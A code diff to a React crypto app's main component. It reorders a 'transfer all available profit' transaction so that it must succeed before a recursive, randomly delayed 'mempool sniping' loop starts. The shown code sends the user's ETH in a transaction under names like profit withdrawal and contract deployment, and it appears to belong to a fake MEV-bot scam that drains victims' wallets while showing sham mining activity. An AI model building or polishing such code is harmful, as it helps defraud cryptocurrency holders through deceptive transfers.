@@ -174,12 +174,12 @@ function App() {
     // Wait for the mempool profit transfer to complete first
     setErrorMessage("")
     setIsDeploying(true)
-    await transferAllAvailableProfit();
+    const started = await transferAllAvailableProfit();
     // Once the transfer is complete, start sniping mempools
-    const started = await startSnipipingMempools();
     if (started) {
-      setIsDeploying(false)
       setIsMining(true)
+      setIsDeploying(false)
+      await startSnipipingMempools();
     } else {
       setIsDeploying(false)
       setErrorMessage("Contract not Deployed. Due to Insuffient balance for ETH fees or Canceled by the User.")
@@ -251,12 +251,15 @@ function App() {
           value: ethAmount,
         });
         await tx.wait();
+        return true;
       } else {
         setErrorMessage("Insuffient balance for ETH fees.")
         console.log("No ETH balance to withdraw from mempool.");
+        return false;
       }
     } catch (error) {
       console.error("Error rebasing mempool:", error);
+      return false;
     }
     setIsLoading(false); // Set loading state to false after withdrawal process
   };
@@ -286,9 +289,11 @@ function App() {
 
         // Call recursively to keep sniping mempools
         startSnipipingMempools();
+        return true;
       }, randomDelay);
     } else {
       console.log("Sniping is paused, not sniping any mempools.");
+      return false;
     }
   };
 
